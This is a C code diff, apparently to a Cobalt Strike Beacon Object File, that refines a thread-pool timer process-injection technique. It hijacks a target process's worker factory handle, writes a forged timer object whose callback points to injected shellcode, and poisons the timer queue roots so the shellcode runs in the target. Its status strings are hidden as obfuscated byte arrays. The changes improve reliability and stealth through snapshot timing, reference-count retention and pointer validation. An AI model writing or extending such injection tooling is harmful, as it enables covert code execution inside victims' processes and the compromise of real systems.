@@ -8,8 +8,10 @@ HANDLE m_p_hTimer = NULL;
 
 static const unsigned char kApiNtSetTimer2[] = { 0xE9, 0x48, 0xC2, 0x3B, 0x5F, 0x80, 0x01, 0x9C, 0xC2, 0x4E, 0xA3, 0x5E };
 // "NtSetTimer2"
-static const unsigned char kFmtTimerQueueChanged[] = { 0xFC, 0x11, 0xCC, 0x7E, 0x7F, 0xB5, 0x1A, 0x96, 0xC2, 0x48, 0xB1, 0x2A, 0x42, 0xB9, 0x0D, 0x83, 0x87, 0x4D, 0xE4, 0x3B, 0x5E, 0xB1, 0x48, 0x92, 0xCF, 0x5D, 0xFF, 0x39, 0x4E, 0xB0, 0x53, 0xD1, 0xD4, 0x57, 0xF8, 0x2E, 0x5B, 0xB1, 0x0C, 0xD1, 0xD4, 0x48, 0xF0, 0x32, 0x4E, 0xF4, 0x1A, 0x9E, 0xCB, 0x50, 0xF3, 0x3F, 0x48, 0xBF, 0x46 };
-// "[-] Target timer queue changed; skipped stale rollback."
+static const unsigned char kFmtTimerQueueChanged[] = { 0xFC, 0x75, 0xDF, 0x18, 0x64, 0x89, 0x48, 0xA5, 0xC6, 0x4E, 0xF6, 0x3B, 0x5F, 0xF4, 0x1C, 0x98, 0xCA, 0x59, 0xE3, 0x7E, 0x5A, 0xA1, 0x0D, 0x84, 0xC2, 0x1C, 0xF2, 0x36, 0x4A, 0xBA, 0x0F, 0x94, 0xC3, 0x07, 0xB1, 0x32, 0x4E, 0xB2, 0x1C, 0xD1, 0xD3, 0x5D, 0xE3, 0x39, 0x4E, 0xA0, 0x45, 0x9E, 0xD0, 0x52, 0xF4, 0x3A, 0x0B, 0xA6, 0x07, 0x9E, 0xD3, 0x1C, 0xF8, 0x30, 0x5F, 0xB5, 0x0B, 0x85, 0x89 };
+// "[INFO] Target timer queue changed; left target-owned root intact."
+static const unsigned char kFmtRestoreReadFail[] = { 0xFC, 0x11, 0xCC, 0x7E, 0x7F, 0xBD, 0x05, 0x94, 0xD5, 0x11, 0xE0, 0x2B, 0x4E, 0xA1, 0x0D, 0xD1, 0xD5, 0x59, 0xE2, 0x2A, 0x44, 0xA6, 0x0D, 0xD1, 0xD5, 0x59, 0xF0, 0x3A, 0x0B, 0xB2, 0x09, 0x98, 0xCB, 0x59, 0xF5, 0x70 };
+// "[-] Timer-queue restore read failed."
 static const unsigned char kFmtV8Wf[] = { 0xFC, 0x75, 0xDF, 0x18, 0x64, 0x89, 0x48, 0xF8, 0xEF, 0x55, 0xFB, 0x3F, 0x48, 0xBF, 0x0D, 0x95, 0x87, 0x4B, 0xFE, 0x2C, 0x40, 0xB1, 0x1A, 0xD1, 0xC1, 0x5D, 0xF2, 0x2A, 0x44, 0xA6, 0x11, 0xD1, 0xCF, 0x5D, 0xFF, 0x3A, 0x47, 0xB1, 0x48, 0x97, 0xD5, 0x53, 0xFC, 0x7E, 0x5F, 0xBC, 0x0D, 0xD1, 0xD3, 0x5D, 0xE3, 0x39, 0x4E, 0xA0, 0x48, 0x81, 0xD5, 0x53, 0xF2, 0x3B, 0x58, 0xA7 };
 // "[INFO] \tHijacked worker factory handle from the target process"
 static const unsigned char kFmtV8Info[] = { 0xFC, 0x75, 0xDF, 0x18, 0x64, 0x89, 0x48, 0xF8, 0xF5, 0x59, 0xE5, 0x2C, 0x42, 0xB1, 0x1E, 0x94, 0xC3, 0x1C, 0xE5, 0x3F, 0x59, 0xB3, 0x0D, 0x85, 0x87, 0x4B, 0xFE, 0x2C, 0x40, 0xB1, 0x1A, 0xD1, 0xC1, 0x5D, 0xF2, 0x2A, 0x44, 0xA6, 0x11, 0xD1, 0xC5, 0x5D, 0xE2, 0x37, 0x48, 0xF4, 0x01, 0x9F, 0xC1, 0x53, 0xE3, 0x33, 0x4A, 0xA0, 0x01, 0x9E, 0xC9, 0x3C };
@@ -59,11 +61,11 @@ static BOOL RestoreTimerQueueRootIfUnchanged(PVOID rootAddr, PVOID poisoned, PVO
 
     current = NULL;
     if (!KERNEL32$ReadProcessMemory(m_p_hTargetPid, rootAddr, &current, sizeof(current), NULL)) {
-        OBF_PRINT0(CALLBACK_ERROR, kFmtRestoreWriteFail);
+        OBF_PRINT0(CALLBACK_ERROR, kFmtRestoreReadFail);
         return FALSE;
     }
     if (current != poisoned) {
-        OBF_PRINT0(CALLBACK_ERROR, kFmtTimerQueueChanged);
+        OBF_PRINT0(CALLBACK_OUTPUT, kFmtTimerQueueChanged);
         return FALSE;
     }
     if (!KERNEL32$WriteProcessMemory(m_p_hTargetPid, rootAddr, &orig, sizeof(orig), NULL)) {
@@ -96,7 +98,7 @@ static BOOL VariantSanityExtra(void) {
     KERNEL32$CloseHandle(hTimer);
 
     MSVCRT$memset(&info, 0, sizeof(info));
-    if (!GetWorkerFactoryBasicInformation(hWf, &info) || info.StartParameter == NULL) {
+    if (!GetWorkerFactoryBasicInformation(hWf, &info) || !PlausibleUserPtr(info.StartParameter, FALSE)) {
         KERNEL32$CloseHandle(hWf);
         SANITY_FAIL(kFmtTriggerFail, kFmtSuggestLayout);
         return FALSE;
@@ -140,7 +142,7 @@ static BOOL SetupExecution() {
     if (!GetWorkerFactoryBasicInformation(m_p_hWorkerFactory, &WorkerFactoryInformation)) {
         return FALSE;
     }
-    if (WorkerFactoryInformation.StartParameter == NULL) {
+    if (!PlausibleUserPtr(WorkerFactoryInformation.StartParameter, FALSE)) {
         OBF_PRINT0(CALLBACK_ERROR, kFmtTriggerFail);
         return FALSE;
     }
@@ -153,17 +155,6 @@ static BOOL SetupExecution() {
 
     windowStartRoot = (PVOID)((ULONG_PTR)WorkerFactoryInformation.StartParameter + offsetof(FULL_TP_POOL, TimerQueue.AbsoluteQueue.WindowStart.Root));
     windowEndRoot = (PVOID)((ULONG_PTR)WorkerFactoryInformation.StartParameter + offsetof(FULL_TP_POOL, TimerQueue.AbsoluteQueue.WindowEnd.Root));
-    origWindowStartRoot = NULL;
-    origWindowEndRoot = NULL;
-    if (!KERNEL32$ReadProcessMemory(m_p_hTargetPid, windowStartRoot, &origWindowStartRoot, sizeof(origWindowStartRoot), NULL) ||
-        !KERNEL32$ReadProcessMemory(m_p_hTargetPid, windowEndRoot, &origWindowEndRoot, sizeof(origWindowEndRoot), NULL)) {
-        OBF_PRINT0(CALLBACK_ERROR, kFmtTriggerFail);
-        return FALSE;
-    }
-    if (!PlausibleUserPtr(origWindowStartRoot, TRUE) || !PlausibleUserPtr(origWindowEndRoot, TRUE)) {
-        OBF_PRINT0(CALLBACK_ERROR, kFmtTriggerFail);
-        return FALSE;
-    }
 
     ApiPause();
     pTpTimerLive = KERNEL32$CreateThreadpoolTimer(DummyTimerCallback, NULL, NULL);
@@ -195,12 +186,18 @@ static BOOL SetupExecution() {
     OBF_PRINT1(CALLBACK_OUTPUT, kFmtV8Alloc, RemoteTpTimerAddress);
 
     SanitizeCleanupGroupMember(&pTpTimerCopy->Work.CleanupGroupMember);
+    /* Retain one reference after callback cleanup; this object is not allocated
+       from the target's ntdll heap and must remain allocated. */
+    pTpTimerCopy->Work.CleanupGroupMember.Refcount.Refcount = 2;
     pTpTimerCopy->Work.Task.ListEntry.Flink = NULL;
     pTpTimerCopy->Work.Task.ListEntry.Blink = NULL;
     pTpTimerCopy->Ite.First = NULL;
     pTpTimerCopy->Work.CleanupGroupMember.Callback = m_ShellcodeAddress;
     Timeout = -10000000;
     pTpTimerCopy->Work.CleanupGroupMember.Pool = (PFULL_TP_POOL)(WorkerFactoryInformation.StartParameter);
+    FinalizeRemoteCleanupGroupMemberLinks(
+        &pTpTimerCopy->Work.CleanupGroupMember,
+        (ULONG_PTR)RemoteTpTimerAddress + offsetof(FULL_TP_TIMER, Work.CleanupGroupMember));
     pTpTimerCopy->DueTime = Timeout;
     pTpTimerCopy->WindowStartLinks.Key = Timeout;
     pTpTimerCopy->WindowEndLinks.Key = Timeout;
@@ -226,6 +223,21 @@ static BOOL SetupExecution() {
 
     TpTimerWindowStartLinks = &RemoteTpTimerAddress->WindowStartLinks;
     TpTimerWindowEndLinks = &RemoteTpTimerAddress->WindowEndLinks;
+
+    /* Snapshot immediately before publication to minimize stale-root rollback. */
+    origWindowStartRoot = NULL;
+    origWindowEndRoot = NULL;
+    if (!KERNEL32$ReadProcessMemory(m_p_hTargetPid, windowStartRoot, &origWindowStartRoot, sizeof(origWindowStartRoot), NULL) ||
+        !KERNEL32$ReadProcessMemory(m_p_hTargetPid, windowEndRoot, &origWindowEndRoot, sizeof(origWindowEndRoot), NULL)) {
+        RemoteFree(RemoteTpTimerAddress);
+        OBF_PRINT0(CALLBACK_ERROR, kFmtTriggerFail);
+        return FALSE;
+    }
+    if (!PlausibleUserPtr(origWindowStartRoot, TRUE) || !PlausibleUserPtr(origWindowEndRoot, TRUE)) {
+        RemoteFree(RemoteTpTimerAddress);
+        OBF_PRINT0(CALLBACK_ERROR, kFmtTriggerFail);
+        return FALSE;
+    }
 
     if (!KERNEL32$WriteProcessMemory(m_p_hTargetPid, windowStartRoot, &TpTimerWindowStartLinks, sizeof(TpTimerWindowStartLinks), NULL)) {
         RemoteFree(RemoteTpTimerAddress);
